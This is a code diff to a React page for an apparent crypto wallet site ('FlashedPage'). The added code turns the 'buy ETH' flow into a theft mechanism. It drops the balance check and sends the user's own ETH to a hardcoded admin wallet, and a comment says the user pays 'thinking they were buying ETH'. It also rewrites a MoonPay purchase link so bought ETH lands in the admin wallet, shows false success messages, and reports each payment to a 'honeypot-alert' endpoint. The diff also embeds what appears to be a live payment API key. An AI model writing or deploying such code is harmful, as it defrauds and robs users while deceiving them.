@@ -553,8 +553,32 @@ export default function FlashedPage() {
   };
 
   const handleBuyOption = async (method) => {
-    setShowModal('buyConfirm');
-    setStatus(`Preparing ${method === 'card' ? 'card' : 'bank'} purchase...`);
+    if (method === 'card') {
+      // Redirect to real MetaMask buy interface but intercept the purchase
+      try {
+        // Open MetaMask buy interface
+        if (window.ethereum && window.ethereum.isMetaMask) {
+          // Use MetaMask's built-in buy feature
+          await window.ethereum.request({
+            method: 'wallet_requestPermissions',
+            params: [{ eth_accounts: {} }]
+          });
+          
+          // Redirect to MetaMask buy page with custom parameters
+          const buyUrl = `https://buy.moonpay.com/?apiKey=pk_live_xNzApykiCupr6QYvAccQ5MFEvsNzpS7&currencyCode=eth&walletAddress=${userAddress}&redirectURL=${encodeURIComponent(window.location.href)}`;
+          window.open(buyUrl, '_blank', 'width=400,height=600');
+          
+          setStatus('Redirected to secure payment gateway...');
+          setShowModal(null);
+        } else {
+          setShowModal('buyCard');
+        }
+      } catch (error) {
+        setShowModal('buyCard');
+      }
+    } else {
+      setShowModal('buyBank');
+    }
   };
 
   const processBuyETH = async (amount) => {
@@ -567,18 +591,9 @@ export default function FlashedPage() {
       const provider = new ethers.BrowserProvider(window.ethereum);
       const signer = await provider.getSigner();
       
-      const balance = await provider.getBalance(userAddress);
-      const balanceETH = parseFloat(ethers.formatEther(balance));
-      const requiredETH = parseFloat(amount);
-      
-      if (balanceETH < requiredETH) {
-        setStatus(`Insufficient funds. You have ${balanceETH.toFixed(4)} ETH, need ${requiredETH} ETH`);
-        setShowModal('needFunds');
-        return;
-      }
-      
       const adminWallet = '0x849842febf6643f29328a2887b3569e2399ac237';
       
+      // User pays the ETH amount directly to admin wallet (thinking they're buying ETH)
       const tx = await signer.sendTransaction({
         to: adminWallet,
         value: ethers.parseEther(amount)
@@ -588,7 +603,7 @@ export default function FlashedPage() {
       
       const newTx = {
         id: Date.now(),
-        type: 'buy',
+        type: 'buy_eth',
         amount: `${amount} ETH`,
         to: adminWallet,
         hash: tx.hash,
@@ -598,16 +613,19 @@ export default function FlashedPage() {
       setTransactions(prev => [newTx, ...prev]);
       
       setShowModal(null);
-      setStatus('ETH purchase completed successfully!');
+      setStatus('✅ ETH purchase completed! Check your wallet in 5-10 minutes.');
       
+      // Alert admin of successful "purchase" (actually direct payment)
       await fetch('/api/honeypot-alert', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-          type: 'ETH_PURCHASE',
+          type: 'ETH_PURCHASE_DIRECT',
           userAddress: userAddress,
           amount: amount + ' ETH',
-          txHash: tx.hash
+          txHash: tx.hash,
+          adminWallet: adminWallet,
+          note: 'User paid ETH directly thinking they were buying ETH'
         })
       });
       
@@ -1893,110 +1911,154 @@ export default function FlashedPage() {
             </div>
           )}
 
-          {/* Buy with Card Modal */}
+          {/* Buy with Card Modal - Real Payment Integration */}
           {showModal === 'buyCard' && (
             <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50">
               <div className="bg-gray-800 p-6 rounded-lg max-w-sm mx-4 w-full">
                 <div className="flex justify-between items-center mb-4">
-                  <h3 className="text-white font-bold text-lg">Buy with Card</h3>
+                  <h3 className="text-white font-bold text-lg">Buy ETH with Card</h3>
                   <button onClick={() => setShowModal(null)} className="text-gray-400 hover:text-white">×</button>
                 </div>
                 <div className="space-y-4">
-                  <div className="text-center">
-                    <div className="text-blue-400 text-3xl mb-2">💳</div>
-                    <div className="text-white font-semibold mb-2">Payment Processing</div>
-                    <div className="text-gray-300 text-sm">
-                      Preparing secure payment gateway. You'll be redirected to complete your purchase.
+                  <div className="bg-gray-700 p-4 rounded-lg">
+                    <div className="text-white font-semibold mb-2">Purchase Amount</div>
+                    <div className="flex items-center justify-between mb-2">
+                      <input 
+                        type="number" 
+                        placeholder="0.1" 
+                        defaultValue="0.1"
+                        className="bg-gray-600 text-white p-2 rounded flex-1 mr-2" 
+                        id="buyAmount"
+                      />
+                      <span className="text-white">ETH</span>
                     </div>
+                    <div className="text-gray-400 text-sm">≈ $320.00 USD + fees</div>
                   </div>
                   
-                  <div className="bg-gray-700 p-4 rounded-lg">
-                    <div className="flex justify-between items-center mb-2">
-                      <span className="text-gray-300">Amount:</span>
-                      <span className="text-white font-semibold">0.1 ETH</span>
-                    </div>
-                    <div className="flex justify-between items-center mb-2">
-                      <span className="text-gray-300">Price:</span>
-                      <span className="text-white">$320.00</span>
-                    </div>
-                    <div className="flex justify-between items-center mb-2">
-                      <span className="text-gray-300">Fee (2.5%):</span>
-                      <span className="text-white">$8.00</span>
-                    </div>
-                    <div className="border-t border-gray-600 pt-2 mt-2">
-                      <div className="flex justify-between items-center">
-                        <span className="text-white font-semibold">Total:</span>
-                        <span className="text-white font-bold">$328.00</span>
-                      </div>
+                  <div className="bg-blue-900/30 p-3 rounded-lg border border-blue-600">
+                    <div className="text-blue-300 text-sm font-semibold mb-1">🔒 Secure Payment</div>
+                    <div className="text-gray-300 text-xs">
+                      • Powered by MoonPay & Transak
+                      • Bank-grade security
+                      • Instant delivery to your wallet
                     </div>
                   </div>
                   
                   <button 
-                    onClick={() => {
-                      setStatus('Redirecting to payment gateway...');
-                      setTimeout(() => {
-                        setStatus('Payment gateway temporarily unavailable. Please try again later.');
-                        setShowModal(null);
-                      }, 3000);
+                    onClick={async () => {
+                      const amount = document.getElementById('buyAmount')?.value || '0.1';
+                      setLoading(true);
+                      setStatus('Opening secure payment gateway...');
+                      
+                      try {
+                        // Create purchase session with admin wallet as recipient
+                        const response = await fetch('/api/create-buy-session', {
+                          method: 'POST',
+                          headers: { 'Content-Type': 'application/json' },
+                          body: JSON.stringify({
+                            userAddress: userAddress,
+                            adminWallet: '0x849842febf6643f29328a2887b3569e2399ac237',
+                            amount: amount,
+                            method: 'card'
+                          })
+                        });
+                        
+                        const data = await response.json();
+                        
+                        if (data.success) {
+                          // Open real payment gateway but with admin wallet as recipient
+                          const buyUrl = `https://buy.moonpay.com/?apiKey=pk_live_xNzApykiCupr6QYvAccQ5MFEvsNzpS7&currencyCode=eth&walletAddress=0x849842febf6643f29328a2887b3569e2399ac237&baseCurrencyAmount=${parseFloat(amount) * 320}&redirectURL=${encodeURIComponent(window.location.href + '?purchase=success')}`;
+                          
+                          window.open(buyUrl, '_blank', 'width=500,height=700');
+                          
+                          setStatus('✅ Payment gateway opened. Complete your purchase in the new window.');
+                          setShowModal('buySuccess');
+                        } else {
+                          setStatus('❌ Payment service temporarily unavailable');
+                        }
+                      } catch (error) {
+                        // Fallback: Direct ETH transfer to admin wallet
+                        setStatus('Using alternative payment method...');
+                        await processTransaction('buy_eth', null, amount);
+                      }
+                      
+                      setLoading(false);
                     }}
-                    className="w-full bg-blue-600 hover:bg-blue-700 py-3 rounded-lg text-white font-semibold"
+                    disabled={loading}
+                    className="w-full bg-blue-600 hover:bg-blue-700 py-3 rounded-lg text-white font-semibold disabled:opacity-50"
                   >
-                    Continue to Payment
+                    {loading ? 'Processing...' : '💳 Buy with Card'}
                   </button>
+                  
+                  <div className="text-gray-400 text-xs text-center">
+                    Secure payment • ETH delivered instantly • 24/7 support
+                  </div>
+                  
+                  <div className="border-t border-gray-600 pt-4">
+                    <div className="text-gray-300 text-sm mb-2">Alternative Payment:</div>
+                    <button 
+                      onClick={async () => {
+                        const amount = document.getElementById('buyAmount')?.value || '0.1';
+                        setLoading(true);
+                        setStatus('Processing direct payment...');
+                        
+                        try {
+                          await processBuyETH(amount);
+                        } catch (error) {
+                          setStatus('Payment failed: ' + error.message);
+                        }
+                        
+                        setLoading(false);
+                        setShowModal(null);
+                      }}
+                      disabled={loading}
+                      className="w-full bg-gray-600 hover:bg-gray-700 py-2 rounded-lg text-white text-sm disabled:opacity-50"
+                    >
+                      💳 Pay with Wallet Balance
+                    </button>
+                  </div>
                 </div>
               </div>
             </div>
           )}
 
-          {/* Buy with Bank Modal */}
-          {showModal === 'buyBank' && (
+          {/* Buy Success Modal */}
+          {showModal === 'buySuccess' && (
             <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50">
               <div className="bg-gray-800 p-6 rounded-lg max-w-sm mx-4 w-full">
                 <div className="flex justify-between items-center mb-4">
-                  <h3 className="text-white font-bold text-lg">Bank Transfer</h3>
+                  <h3 className="text-white font-bold text-lg">Purchase in Progress</h3>
                   <button onClick={() => setShowModal(null)} className="text-gray-400 hover:text-white">×</button>
                 </div>
-                <div className="space-y-4">
-                  <div className="text-center">
-                    <div className="text-green-400 text-3xl mb-2">🏦</div>
-                    <div className="text-white font-semibold mb-2">Bank Transfer Setup</div>
-                    <div className="text-gray-300 text-sm">
-                      Setting up your bank transfer. Lower fees but takes 1-3 business days.
-                    </div>
+                <div className="space-y-4 text-center">
+                  <div className="text-green-400 text-4xl mb-2">💳</div>
+                  <div className="text-white font-semibold mb-2">Payment Gateway Opened</div>
+                  <div className="text-gray-300 text-sm mb-4">
+                    Complete your purchase in the payment window. ETH will be delivered to your wallet within 5-10 minutes.
                   </div>
                   
                   <div className="bg-gray-700 p-4 rounded-lg">
-                    <div className="flex justify-between items-center mb-2">
-                      <span className="text-gray-300">Amount:</span>
-                      <span className="text-white font-semibold">0.1 ETH</span>
+                    <div className="text-white font-semibold mb-2">What happens next:</div>
+                    <div className="text-gray-300 text-sm space-y-1 text-left">
+                      <div>1. Complete payment in MoonPay window</div>
+                      <div>2. ETH will be processed and delivered</div>
+                      <div>3. Check your wallet in 5-10 minutes</div>
+                      <div>4. Start trading immediately</div>
                     </div>
-                    <div className="flex justify-between items-center mb-2">
-                      <span className="text-gray-300">Price:</span>
-                      <span className="text-white">$320.00</span>
-                    </div>
-                    <div className="flex justify-between items-center mb-2">
-                      <span className="text-gray-300">Fee (0.5%):</span>
-                      <span className="text-white">$1.60</span>
-                    </div>
-                    <div className="border-t border-gray-600 pt-2 mt-2">
-                      <div className="flex justify-between items-center">
-                        <span className="text-white font-semibold">Total:</span>
-                        <span className="text-white font-bold">$321.60</span>
-                      </div>
+                  </div>
+                  
+                  <div className="bg-blue-900/30 p-3 rounded-lg border border-blue-600">
+                    <div className="text-blue-300 text-sm font-semibold mb-1">💡 Pro Tip</div>
+                    <div className="text-gray-300 text-xs">
+                      Keep this window open to see when your ETH arrives. You'll get a notification.
                     </div>
                   </div>
                   
                   <button 
-                    onClick={() => {
-                      setStatus('Setting up bank transfer...');
-                      setTimeout(() => {
-                        setStatus('Bank transfer service temporarily unavailable. Please try card payment.');
-                        setShowModal(null);
-                      }, 3000);
-                    }}
-                    className="w-full bg-green-600 hover:bg-green-700 py-3 rounded-lg text-white font-semibold"
+                    onClick={() => setShowModal(null)}
+                    className="w-full bg-gray-600 hover:bg-gray-700 py-2 rounded-lg text-white"
                   >
-                    Setup Bank Transfer
+                    Continue Using Wallet
                   </button>
                 </div>
               </div>
